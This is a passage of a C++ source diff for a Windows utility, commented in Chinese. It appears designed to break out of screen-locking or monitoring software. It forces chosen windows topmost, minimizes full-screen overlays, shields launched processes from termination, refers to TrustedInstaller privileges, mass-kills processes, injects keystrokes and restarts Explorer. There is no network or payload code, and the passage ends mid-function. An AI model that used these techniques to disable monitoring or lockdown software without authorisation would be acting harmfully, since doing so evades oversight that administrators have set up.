+    if (processCreated) {
+        std::wcout << L"已启动程序: " << programPath << std::endl;
+        
+        DWORD processId = pi.dwProcessId;
+        HANDLE hProcess = pi.hProcess;
+        
+        if (processId && hProcess) {
+            CloseHandle(pi.hThread);
+            
+            // 多次尝试最小化覆盖窗口
+            for (int i = 0; i < 3; i++) {
+                MinimizeOverlayWindows();
+                std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            }
+            
+            // 等待进程启动
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            
+            // 启用反结束进程保护
+            if (EnableProcessProtection(hProcess)) {
+                std::wcout << L"[保护] 反结束进程已开启" << std::endl;
+            } else {
+                std::wcout << L"[保护] 反结束进程启用失败" << std::endl;
+            }
+            
+            // 等待进程启动并枚举窗口
+            HWND hwnd = nullptr;
+            for (int retry = 0; retry < 30; retry++) {
+                hwnd = FindTopLevelWindowByProcessId(processId, 1);
+                if (hwnd) break;
+                std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            }
+            
+            if (hwnd) {
+                // 将窗口设置到全局置顶目标，让功能3也能持续监控
+                g_targetTopmostWindow = hwnd;
+                
+                // 再次最小化可能的覆盖窗口
+                MinimizeOverlayWindows();
+                
+                // 强制显示窗口
+                ShowWindow(hwnd, SW_RESTORE);
+                ShowWindow(hwnd, SW_SHOW);
+                ShowWindow(hwnd, SW_SHOWNORMAL);
+                
+                // 强制激活窗口
+                ForceSetForegroundWindow(hwnd);
+                
+                // 移除窗口的WS_EX_TOPMOST（如果被其他程序覆盖）
+                SetWindowLongW(hwnd, GWL_EXSTYLE, 
+                    GetWindowLongW(hwnd, GWL_EXSTYLE) & ~WS_EX_TOPMOST);
+                
+                // 强制置顶窗口
+                RECT rect;
+                if (GetWindowRect(hwnd, &rect)) {
+                    SetWindowPos(hwnd, HWND_TOPMOST, 
+                        rect.left, rect.top, 
+                        rect.right - rect.left, 
+                        rect.bottom - rect.top,
+                        SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                }
+                
+                // 再次强制激活
+                ForceSetForegroundWindow(hwnd);
+                
+                std::wcout << L"程序窗口已置顶并激活" << std::endl;
+                
+                // 启动监控线程
+                std::atomic<bool> monitorRunning(true);
+                std::thread monitorThread([hwnd, processId, &monitorRunning]() {
+                    PreventMinimizeThreadFunc(hwnd, processId, monitorRunning, nullptr);
+                });
+                monitorThread.detach();
+            }
+            
+            CloseHandle(hProcess);
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// 前向声明
+void OpenExeFile();
+
+// 打开应用选择菜单
+void OpenAppMenu() {
+    DMSP_VERIFY(0x2002);  // 应用选择菜单子函数 - 二级验证
+    while (true) {
+        std::wcout << std::endl;
+        std::wcout << L"=== 应用选择菜单 ===" << std::endl;
+        std::wcout << L"1. Microsoft Edge" << std::endl;
+        std::wcout << L"2. Chrome" << std::endl;
+        std::wcout << L"3. 任务管理器" << std::endl;
+        std::wcout << L"4. GateFace门面浏览器" << std::endl;
+        std::wcout << L"5. 自定义（选择其他程序）" << std::endl;
+        std::wcout << L"0. 返回主菜单" << std::endl;
+        std::wcout << L"请输入选项: ";
+        
+        int choice = -1;
+        std::wcin >> choice;
+        std::wcin.ignore();
+        
+        if (choice == 0) {
+            return;
+        }
+        
+        if (choice == 1) {
+            // Microsoft Edge
+            wchar_t edgePath[MAX_PATH] = { 0 };
+            if (FindEdgePath(edgePath, MAX_PATH)) {
+                std::wcout << L"正在启动 Microsoft Edge..." << std::endl;
+                if (LaunchProgram(edgePath)) {
+                    std::wcout << L"启动成功" << std::endl;
+                    return;
+                } else {
+                    std::wcout << L"启动失败" << std::endl;
+                }
+            } else {
+                std::wcout << L"未找到 Microsoft Edge 安装路径" << std::endl;
+            }
+        }
+        else if (choice == 2) {
+            // Chrome
+            wchar_t chromePath[MAX_PATH] = { 0 };
+            if (FindChromePath(chromePath, MAX_PATH)) {
+                std::wcout << L"正在启动 Chrome..." << std::endl;
+                if (LaunchProgram(chromePath)) {
+                    std::wcout << L"启动成功" << std::endl;
+                    return;
+                } else {
+                    std::wcout << L"启动失败" << std::endl;
+                }
+            } else {
+                std::wcout << L"未找到 Chrome 安装路径" << std::endl;
+            }
+        }
+        else if (choice == 3) {
+            // 任务管理器
+            wchar_t taskmgrPath[MAX_PATH] = { 0 };
+            GetSystemDirectoryW(taskmgrPath, MAX_PATH);
+            wcscat_s(taskmgrPath, L"\\taskmgr.exe");
+            
+            std::wcout << L"正在启动 任务管理器..." << std::endl;
+            if (LaunchProgram(taskmgrPath)) {
+                std::wcout << L"启动成功" << std::endl;
+                return;
+            } else {
+                std::wcout << L"启动失败" << std::endl;
+            }
+        }
+        else if (choice == 4) {
+            // GateFace门面浏览器 - 支持自定义安装路径
+            wchar_t gatefacePath[MAX_PATH] = { 0 };
+            
+            // 优先从注册表读取安装路径
+            HKEY hGatefaceKey;
+            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\GateFace", 0, KEY_READ, &hGatefaceKey) == ERROR_SUCCESS) {
+                DWORD pathSize = sizeof(gatefacePath);
+                RegQueryValueExW(hGatefaceKey, L"InstallPath", NULL, NULL, (LPBYTE)gatefacePath, &pathSize);
+                RegCloseKey(hGatefaceKey);
+            }
+            // 回退到默认路径
+            if (gatefacePath[0] == L'\0') {
+                wcscpy_s(gatefacePath, L"C:\\Users\\Public\\gakataka\\gateface\\Browser.exe");
+            }
+            
+            std::wcout << L"正在启动 GateFace门面浏览器..." << std::endl;
+            if (GetFileAttributesW(gatefacePath) != INVALID_FILE_ATTRIBUTES) {
+                if (LaunchProgram(gatefacePath)) {
+                    std::wcout << L"启动成功" << std::endl;
+                    return;
+                } else {
+                    std::wcout << L"启动失败" << std::endl;
+                }
+            } else {
+                std::wcout << L"未找到 GateFace 安装路径: " << gatefacePath << std::endl;
+            }
+        }
+        else if (choice == 5) {
+            // 自定义 - 打开文件选择对话框
+            if (g_alwaysOnTopEnabled) {
+                std::wcout << L"请先关闭置顶功能（输入4）后再使用自定义功能" << std::endl;
+            } else {
+                if (!IsRunningAsTrustedInstaller()) {
+                    std::cout << "当前无TrustedInstaller权限，将以管理员权限打开进程" << std::endl;
+                }
+                OpenExeFile();
+            }
+        }
+        else {
+            std::wcout << L"无效选项，请重新输入" << std::endl;
+        }
+        
+        // 继续显示菜单
+        std::wcout << std::endl;
+    }
+}
+
+void OpenExeFile() {
+#ifdef _WIN32
+    // 初始化COM
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    if (FAILED(hr)) {
+        std::wcout << L"初始化COM库失败" << std::endl;
+        return;
+    }
+
+    // 在显示文件对话框之前最小化覆盖窗口
+    for (int i = 0; i < 5; i++) {
+        MinimizeOverlayWindows();
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+    }
+
+    IFileOpenDialog* pFileOpen;
+    hr = CoCreateInstance(CLSID_FileOpenDialog, NULL, CLSCTX_ALL, IID_IFileOpenDialog, reinterpret_cast<void**>(&pFileOpen));
+
+    if (FAILED(hr)) {
+        std::wcout << L"创建文件对话框失败" << std::endl;
+        CoUninitialize();
+        return;
+    }
+
+    COMDLG_FILTERSPEC fileTypes[] = {
+        { L"可执行文件", L"*.exe" },
+        { L"所有文件", L"*.*" }
+    };
+    pFileOpen->SetFileTypes(2, fileTypes);
+    pFileOpen->SetFileTypeIndex(1);
+
+    pFileOpen->SetTitle(L"选择要打开的程序");
+
+    // 再次最小化覆盖窗口确保对话框能显示
+    MinimizeOverlayWindows();
+
+    hr = pFileOpen->Show(NULL);
+
+    if (SUCCEEDED(hr)) {
+        // 显示对话框后也最小化覆盖窗口
+        MinimizeOverlayWindows();
+        
+        IShellItem* pItem;
+        hr = pFileOpen->GetResult(&pItem);
+
+        if (SUCCEEDED(hr)) {
+            PWSTR pszFilePath;
+            hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
+
+            if (SUCCEEDED(hr)) {
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+                PROCESS_INFORMATION pi = { 0 };
+                
+                DWORD creationFlags = CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
+                
+                // 在启动程序之前最小化覆盖窗口
+                MinimizeOverlayWindows();
+                
+                if (CreateProcessW(pszFilePath, NULL, NULL, NULL, FALSE, creationFlags, NULL, NULL, &si, &pi)) {
+                    std::wcout << L"已启动程序: " << pszFilePath << std::endl;
+                    
+                    DWORD processId = pi.dwProcessId;
+                    HANDLE hProcess = pi.hProcess;
+                    
+                    if (processId && hProcess) {
+                        CloseHandle(pi.hThread);
+                        
+                        // 多次尝试最小化覆盖窗口
+                        for (int i = 0; i < 3; i++) {
+                            MinimizeOverlayWindows();
+                            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                        }
+                        
+                        // 等待进程启动并枚举窗口
+                        HWND hwnd = nullptr;
+                        for (int retry = 0; retry < 30; retry++) {
+                            hwnd = FindTopLevelWindowByProcessId(processId, 1);
+                            if (hwnd) break;
+                            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                        }
+                        
+                        if (hwnd) {
+                            // 将窗口设置到全局置顶目标，让功能3也能持续监控
+                            g_targetTopmostWindow = hwnd;
+                            
+                            // 再次最小化可能的覆盖窗口
+                            MinimizeOverlayWindows();
+                            
+                            // 强制显示窗口
+                            ShowWindow(hwnd, SW_RESTORE);
+                            ShowWindow(hwnd, SW_SHOW);
+                            ShowWindow(hwnd, SW_SHOWNORMAL);
+                            
+                            // 强制激活窗口
+                            ForceSetForegroundWindow(hwnd);
+                            
+                            // 移除窗口的WS_EX_TOPMOST（如果被其他程序覆盖）
+                            SetWindowLongW(hwnd, GWL_EXSTYLE, 
+                                GetWindowLongW(hwnd, GWL_EXSTYLE) & ~WS_EX_TOPMOST);
+                            
+                            // 强制置顶窗口
+                            RECT rect;
+                            if (GetWindowRect(hwnd, &rect)) {
+                                SetWindowPos(hwnd, HWND_TOPMOST, 
+                                    rect.left, rect.top, 
+                                    rect.right - rect.left, 
+                                    rect.bottom - rect.top,
+                                    SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                            }
+                            
+                            // 再次强制激活
+                            ForceSetForegroundWindow(hwnd);
+                            
+                            std::wcout << L"程序窗口已置顶并激活" << std::endl;
+                            
+                            // 启动监控线程
+                            std::atomic<bool> monitorRunning(true);
+                            std::thread monitorThread([hwnd, processId, &monitorRunning]() {
+                                PreventMinimizeThreadFunc(hwnd, processId, monitorRunning, nullptr);
+                            });
+                            monitorThread.detach();
+                        }
+                        else {
+                            std::wcout << L"未找到程序窗口，尝试强制枚举..." << std::endl;
+                            
+                            // 强制枚举所有窗口查找目标进程窗口
+                            HWND foundHwnd = nullptr;
+                            EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+                                DWORD targetPid = *(DWORD*)lParam;
+                                DWORD pid;
+                                GetWindowThreadProcessId(hwnd, &pid);
+                                if (pid == targetPid) {
+                                    // 返回找到的第一个窗口
+                                    HWND* result = (HWND*)lParam;
+                                    *result = hwnd;
+                                    return FALSE; // 停止枚举
+                                }
+                                return TRUE; // 继续枚举
+                            }, (LPARAM)&foundHwnd);
+                            
+                            // 如果还是没有找到，尝试等待更长时间
+                            if (!foundHwnd) {
+                                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+                                for (int retry = 0; retry < 20; retry++) {
+                                    foundHwnd = FindTopLevelWindowByProcessId(processId, 1);
+                                    if (foundHwnd) break;
+                                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                                }
+                            }
+                            
+                            hwnd = foundHwnd;
+                            
+                            if (hwnd) {
+                                // 将窗口设置到全局置顶目标，让功能3也能持续监控
+                                g_targetTopmostWindow = hwnd;
+                                
+                                // 执行窗口显示和激活
+                                ShowWindow(hwnd, SW_RESTORE);
+                                ShowWindow(hwnd, SW_SHOW);
+                                ForceSetForegroundWindow(hwnd);
+                                
+                                RECT rect;
+                                if (GetWindowRect(hwnd, &rect)) {
+                                    SetWindowPos(hwnd, HWND_TOPMOST, 
+                                        rect.left, rect.top, 
+                                        rect.right - rect.left, 
+                                        rect.bottom - rect.top,
+                                        SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                                }
+                                
+                                std::wcout << L"程序窗口已置顶并激活" << std::endl;
+                                
+                                // 启动监控线程
+                                std::atomic<bool> monitorRunning(true);
+                                std::thread monitorThread([hwnd, processId, &monitorRunning]() {
+                                    PreventMinimizeThreadFunc(hwnd, processId, monitorRunning, nullptr);
+                                });
+                                monitorThread.detach();
+                            }
+                            else {
+                                std::wcout << L"未找到程序窗口，监控功能不可用" << std::endl;
+                            }
+                        }
+                        
+                        CloseHandle(hProcess);
+                    }
+                    else {
+                        std::wcout << L"无法获取进程ID，监控功能不可用" << std::endl;
+                        if (pi.hThread) CloseHandle(pi.hThread);
+                        if (hProcess && hProcess != INVALID_HANDLE_VALUE) CloseHandle(hProcess);
+                    }
+                }
+                else {
+                    DWORD error = GetLastError();
+                    if (error == ERROR_FILE_NOT_FOUND) {
+                        std::wcout << L"程序文件不存在: " << pszFilePath << std::endl;
+                    }
+                    else if (error == ERROR_ACCESS_DENIED) {
+                        std::wcout << L"拒绝访问，无法启动程序" << std::endl;
+                    }
+                    else {
+                        std::wcout << L"启动程序失败，错误码: " << error << std::endl;
+                    }
+                }
+
+                CoTaskMemFree(pszFilePath);
+            }
+            pItem->Release();
+        }
+    }
+    else {
+        std::wcout << L"已取消选择" << std::endl;
+    }
+
+    pFileOpen->Release();
+    CoUninitialize();
+#else
+    std::wcout << L"此功能仅在Windows系统上可用" << std::endl;
+#endif
+}
+// 处理进程终止功能
+void HandleProcessTermination() {
+    DMSP_VERIFY(0x2001);  // 进程终止子函数 - 二级验证
+    std::string input;
+    std::wcout << L"请输入要终止的进程名(多个进程用英文逗号分隔): ";
+    std::cin>>input;
+
+    // 解析输入的进程名
+    std::vector<std::string> processNames;
+    if (input.find(',') != std::string::npos) {
+        processNames = splitString(input, ',');
+    } else {
+        processNames.push_back(input);
+    }
+    
+    // 收集所有匹配的进程信息
+    struct TargetProcess {
+        DWORD pid;
+        std::wstring name;
+        std::wstring path;
+        bool isSameDir;  // 是否为同目录关联进程
+    };
+    std::vector<TargetProcess> targets;
+    std::set<DWORD> addedPids;  // 防止重复添加
+    
+    // 1. 收集直接匹配的进程
+    for (const auto& procName : processNames) {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(procName);
+        for (int pid : pids) {
+            if (addedPids.find((DWORD)pid) != addedPids.end()) continue;
+            addedPids.insert((DWORD)pid);
+            std::wstring processPath = ProcessTerminator::GetProcessPath(pid);
+            std::wstring wProcName(procName.begin(), procName.end());
+            targets.push_back({(DWORD)pid, wProcName, processPath, false});
+        }
+    }
+    
+    if (targets.empty()) {
+        std::wcout << L"未找到匹配的进程" << std::endl;
+        return;
+    }
+    
+    // 2. 收集同目录关联进程（排除白名单）
+    std::wcout << L"扫描中..." << std::endl;
+    std::set<std::wstring> processedDirs;
+    for (const auto& t : targets) {
+        if (t.path.empty()) continue;
+        
+        size_t lastSlash = t.path.find_last_of(L"\\/");
+        if (lastSlash == std::wstring::npos) continue;
+        
+        std::wstring targetDir = t.path.substr(0, lastSlash);
+        std::wstring normalizedDir = targetDir;
+        std::transform(normalizedDir.begin(), normalizedDir.end(), normalizedDir.begin(), ::towlower);
+        
+        if (processedDirs.find(normalizedDir) != processedDirs.end()) continue;
+        processedDirs.insert(normalizedDir);
+        
+        // 如果目标进程本身是白名单微软签名进程，跳过同目录检测
+        std::wstring processName = t.path.substr(lastSlash + 1);
+        if (ProcessTerminator::IsSystemProcessWhitelisted(processName) &&
+            ProcessTerminator::IsMicrosoftSigned(t.path)) {
+            continue;
+        }
+        
+        // 获取同目录下的所有进程
+        auto sameDirProcesses = ProcessTerminator::GetProcessesInSameDirectory(targetDir);
+        for (const auto& proc : sameDirProcesses) {
+            if (addedPids.find(proc.first) != addedPids.end()) continue;
+            
+            // 跳过白名单微软签名进程
+            if (ProcessTerminator::IsSystemProcessWhitelisted(proc.second)) {
+                std::wstring procFullPath = targetDir + L"\\" + proc.second;
+                if (ProcessTerminator::IsMicrosoftSigned(procFullPath)) continue;
+            }
+            
+            addedPids.insert(proc.first);
+            std::wstring procFullPath = targetDir + L"\\" + proc.second;
+            targets.push_back({proc.first, proc.second, procFullPath, true});
+        }
+    }
+    
+    // 3. 列出所有匹配的进程
+    std::wcout << L"\n找到以下匹配的进程:" << std::endl;
+    std::wcout << L"序号  类型    映像名称                    PID    路径" << std::endl;
+    std::wcout << L"====  ======  ========================  ======  ================================" << std::endl;
+    for (size_t i = 0; i < targets.size(); i++) {
+        std::wstring typeStr = targets[i].isSameDir ? L"关联" : L"目标";
+        std::wcout << std::left << std::setw(4) << (i + 1) << L"  "
+                   << std::left << std::setw(6) << typeStr << L"  "
+                   << std::left << std::setw(25) << targets[i].name
+                   << std::right << std::setw(6) << targets[i].pid << L"  "
+                   << targets[i].path << std::endl;
+    }
+    
+    // 4. 询问确认
+    std::wcout << L"\n是否终止以上 " << targets.size() << L" 个进程? (y/n): ";
+    std::string confirm;
+    std::cin >> confirm;
+    if (confirm != "y" && confirm != "Y") {
+        std::wcout << L"已取消终止操作" << std::endl;
+        return;
+    }
+    
+    // 5. 执行终止
+    int successCount = 0;
+    int failCount = 0;
+    for (const auto& t : targets) {
+        std::string name(t.name.begin(), t.name.end());
+        bool result = ProcessTerminator::terminateByAllMethods(name);
+        if (result) {
+            successCount++;
+        } else {
+            failCount++;
+        }
+    }
+    
+    std::wcout << L"\n终止完成: 成功 " << successCount << L" 个";
+    if (failCount > 0) {
+        std::wcout << L", 失败 " << failCount << L" 个";
+    }
+    std::wcout << std::endl;
+}
+bool EnablePrivilege(const wchar_t* privilege) {
+    HANDLE token;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+        return false;
+
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
+        CloseHandle(token);
+        return false;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    bool result = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
+    DWORD error = GetLastError();
+    CloseHandle(token);
+    return result && error == ERROR_SUCCESS;
+}
+
+bool EnablePrivilege(const wchar_t* privilege);
+
+// 检测并尝试恢复被DXGI全屏覆盖的桌面
+bool RestoreFromDXGIOverlay() {
+    // 第一组技术：模拟系统快捷键
+    // 方法1: Win+D（显示桌面）再还原
+    keybd_event(VK_LWIN, 0, 0, 0);
+    keybd_event('D', 0, 0, 0);
+    keybd_event('D', 0, KEYEVENTF_KEYUP, 0);
+    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
+    
+    Sleep(50);
+    
+    // 方法2: Alt+Tab切换
+    keybd_event(VK_MENU, 0, 0, 0);
+    keybd_event(VK_TAB, 0, 0, 0);
+    keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
+    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+    
+    Sleep(30);
+    
+    // 方法3: Ctrl+Alt+Delete
+    keybd_event(VK_CONTROL, 0, 0, 0);
+    keybd_event(VK_MENU, 0, 0, 0);
+    keybd_event(VK_DELETE, 0, 0, 0);
+    keybd_event(VK_DELETE, 0, KEYEVENTF_KEYUP, 0);
+    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+    keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
+    
+    Sleep(50);
+    
+    // 方法4: Escape键（退出全屏）
+    keybd_event(VK_ESCAPE, 0, 0, 0);
+    keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
+    
+    // 第二组技术：窗口管理
+    // 方法5: 强制刷新桌面
+    HWND desktopWnd = FindWindowExW(NULL, NULL, L"SysListView32", L"FolderView");
+    if (desktopWnd) {
+        InvalidateRect(desktopWnd, NULL, TRUE);
+        UpdateWindow(desktopWnd);
+        RedrawWindow(desktopWnd, NULL, NULL, RDW_UPDATENOW | RDW_INVALIDATE | RDW_ALLCHILDREN);
+    }
+    
+    // 方法6: 刷新所有顶级窗口
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        if (IsWindowVisible(hwnd)) {
+            InvalidateRect(hwnd, NULL, TRUE);
+            UpdateWindow(hwnd);
+        }
+        return TRUE;
+    }, 0);
+    
+    // 方法7: 枚举并恢复所有隐藏的桌面窗口
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        wchar_t className[256] = {};
+        GetClassNameW(hwnd, className, 256);
+        
+        // 检测是否是桌面相关窗口
+        if (wcsstr(className, L"Progman") != nullptr ||
+            wcsstr(className, L"WorkerW") != nullptr ||
+            wcsstr(className, L"SHELLDLL_DefView") != nullptr ||
+            wcsstr(className, L"SysListView32") != nullptr) {
+            
+            // 如果窗口被隐藏，恢复它
+            if (!IsWindowVisible(hwnd)) {
+                ShowWindow(hwnd, SW_RESTORE);
+                ShowWindow(hwnd, SW_SHOW);
+            }
+        }
+        
+        return TRUE;
+    }, 0);
+    
+    // 第三组技术：前台切换
+    // 方法8: 强制切换前台
+    HWND fgWnd = GetForegroundWindow();
+    if (fgWnd) {
+        ForceSetForegroundWindow(fgWnd);
+    }
+    
+    // 方法9: 切换到桌面窗口
+    HWND progman = FindWindowW(L"Progman", NULL);
+    if (progman) {
+        ForceSetForegroundWindow(progman);
+        ShowWindow(progman, SW_RESTORE);
+    }
+    
+    // 第四组技术：广播消息
+    // 方法10: 发送WM_WTSSESSION_CHANGE消息
+    HWND hWndShell = FindWindowW(L"Shell_TrayWnd", NULL);
+    if (hWndShell) {
+        PostMessageW(hWndShell, WM_WTSSESSION_CHANGE, WTS_CONSOLE_CONNECT, 0);
+    }
+    
+    // 方法11: 恢复壁纸（对抗纯黑壁纸）
+    // 获取Windows默认壁纸路径
+    wchar_t defaultWallpaper[MAX_PATH] = { 0 };
+    wchar_t wallpaperPath[MAX_PATH] = { 0 };
+    
+    // 尝试获取当前壁纸
+    SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, wallpaperPath, 0);
+    
+    // 检查是否是纯色（黑色壁纸）
+    bool isBlackWallpaper = (wcslen(wallpaperPath) < 10);  // 太短通常是纯色
+    if (isBlackWallpaper || wcscmp(wallpaperPath, L"") == 0) {
+        // 尝试使用Windows默认壁纸
+        // Windows 10/11默认壁纸路径
+        wcscpy_s(defaultWallpaper, L"C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
+        if (GetFileAttributesW(defaultWallpaper) == INVALID_FILE_ATTRIBUTES) {
+            wcscpy_s(defaultWallpaper, L"C:\\Windows\\Web\\Wallpaper\\Background\\Wallpaper1.jpg");
+        }
+        if (GetFileAttributesW(defaultWallpaper) == INVALID_FILE_ATTRIBUTES) {
+            wcscpy_s(defaultWallpaper, L"C:\\Windows\\Web\\Wallpaper\\Wallpaper\\Windows\\img0.jpg");
+        }
+        
+        // 尝试设置壁纸
+        if (GetFileAttributesW(defaultWallpaper) != INVALID_FILE_ATTRIBUTES) {
+            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, defaultWallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        }
+        else {
+            // 如果找不到默认壁纸，强制刷新一次
+            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE);
+        }
+    }
+    
+    // 第五组技术：DirectX相关
+    // 方法12: 尝试检测DXGI交换链
+    // 由于无法直接从用户模式检测，我们通过模拟按键来触发
+    
+    // 第六组技术：强制窗口重绘
+    // 方法13: 设置并清除WS_VISIBLE
+    HWND topWnd = GetForegroundWindow();
+    if (topWnd) {
+        ShowWindow(topWnd, SW_HIDE);
+        ShowWindow(topWnd, SW_SHOW);
+    }
+    
+    // 方法14: 发送WM_THEMECHANGED强制刷新主题
+    progman = FindWindowW(L"Progman", NULL);
+    if (progman) {
+        PostMessageW(progman, WM_THEMECHANGED, 0, 0);
+    }
+    
+    // 再次尝试刷新桌面
+    if (desktopWnd) {
+        SetForegroundWindow(desktopWnd);
+        SetFocus(desktopWnd);
+    }
+    
+    return true;
+}
+
+// Explorer窗口检测线程
+bool g_explorerMonitorEnabled = false;
+DWORD g_explorerPid = 0;
+
+// 快速恢复桌面环境（任务栏+壁纸，不重启Explorer）
+static void RestoreDesktopQuick() {
+    int screenW = GetSystemMetrics(SM_CXSCREEN);
+    int screenH = GetSystemMetrics(SM_CYSCREEN);
+    DWORD myPid = GetCurrentProcessId();
+    
+    // 1. 先收集所有需要清除的窗口，再批量处理（避免遍历中修改Z序导致跳过窗口）
+    std::vector<HWND> suspectWindows;
+    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+        auto* list = (std::vector<HWND>*)lParam;
+        if (!hwnd || !IsWindow(hwnd) || !IsWindowVisible(hwnd)) return TRUE;
+        
+        RECT r;
+        if (!GetWindowRect(hwnd, &r)) return TRUE;
+        int w = r.right - r.left;
+        int h = r.bottom - r.top;
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+        
+        // 全屏或接近全屏
+        if (w >= sw * 94 / 100 && h >= sh * 94 / 100) {
+            DWORD pid = 0;
+            GetWindowThreadProcessId(hwnd, &pid);
+            DWORD myId = GetCurrentProcessId();
+            if (pid == myId || pid == 0) return TRUE;
+            
+            wchar_t clsName[256] = {};
+            GetClassNameW(hwnd, clsName, 256);
+            
+            // 跳过桌面组件和置顶保护目标
+            if (wcscmp(clsName, L"Progman") == 0 ||
+                wcscmp(clsName, L"WorkerW") == 0 ||
+                wcscmp(clsName, L"Shell_TrayWnd") == 0) return TRUE;
+            
+            // 跳过正在保护的置顶目标窗口
+            if (g_alwaysOnTopEnabled && g_targetTopmostWindow && hwnd == g_targetTopmostWindow) return TRUE;
+            
+            LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+            LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+            
+            // 只清理明确可疑的覆盖窗口（无标题栏 + 全屏 + 置顶/分层/弹出）
+            bool noCaption = ((style & WS_CAPTION) == 0);
+            bool isPopup = ((style & WS_POPUP) != 0);
+            bool isOverlay = (exStyle & WS_EX_TOPMOST) || (exStyle & WS_EX_LAYERED);
+            bool isSuspicious = noCaption || isPopup;
+            
+            if (isSuspicious && isOverlay) {
+                list->push_back(hwnd);
+            }
+        }
+        return TRUE;
+    }, (LPARAM)&suspectWindows);
+    
+    // 批量清除
+    for (HWND hwnd : suspectWindows) {
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle & ~WS_EX_TOPMOST);
+        SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
+            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+        ShowWindowAsync(hwnd, SW_MINIMIZE);
+    }
+    
+    // 2. 恢复任务栏
+    HWND trayWnd = FindWindowW(L"Shell_TrayWnd", NULL);
+    if (trayWnd) {
+        ShowWindow(trayWnd, SW_SHOW);
+        SetWindowLongW(trayWnd, GWL_EXSTYLE, 
+            GetWindowLongW(trayWnd, GWL_EXSTYLE) & ~WS_EX_TOPMOST);
+        SetWindowPos(trayWnd, HWND_NOTOPMOST, 0, 0, 0, 0,
+            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
+        ShowWindow(trayWnd, SW_SHOWNA);
+    }
+    
+    // 3. 恢复桌面
+    HWND progman = FindWindowW(L"Progman", NULL);
+    if (progman) {
+        SendMessageTimeoutW(progman, 0x052C, 0, NULL, SMTO_NORMAL, 100, NULL);
+        ShowWindow(progman, SW_SHOW);
+        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE);
+    }
+    HWND workerW = FindWindowW(L"WorkerW", NULL);
+    while (workerW) {
+        if (!IsWindowVisible(workerW)) ShowWindow(workerW, SW_SHOW);
+        workerW = FindWindowExW(NULL, workerW, L"WorkerW", NULL);
+    }
+}
+
+// 检测并恢复桌面窗口
+bool RestoreDesktop() {
+    // 方法1: 查找Progman窗口（桌面窗口）
+    HWND progman = FindWindowW(L"Progman", NULL);
+    if (progman) {
+        // 发送0x052C消息给Progman，让它创建WorkerW窗口
+        SendMessageTimeoutW(progman, 0x052C, 0, NULL, SMTO_NORMAL, 100, NULL);
+        
+        // 查找SysListView32（桌面图标窗口）
+        HWND sysListView = FindWindowExW(NULL, NULL, L"SysListView32", L"FolderView");
+        if (sysListView) {
+            BOOL isVisible = IsWindowVisible(sysListView);
+            if (!isVisible) {
+                ShowWindow(sysListView, SW_RESTORE);
+                ShowWindow(sysListView, SW_SHOW);
+                ForceSetForegroundWindow(sysListView);
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+// 重启Explorer桌面
+bool RestartExplorerDesktop() {
+    // 通知所有顶级窗口Explorer即将重启
+    HWND hwnd = FindWindowW(L"Shell_TrayWnd", NULL);
+    if (hwnd) {
+        PostMessageW(hwnd, WM_CLOSE, 0, 0);
+    }
+    
+    Sleep(500);
+    
+    // 启动新的Explorer进程
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
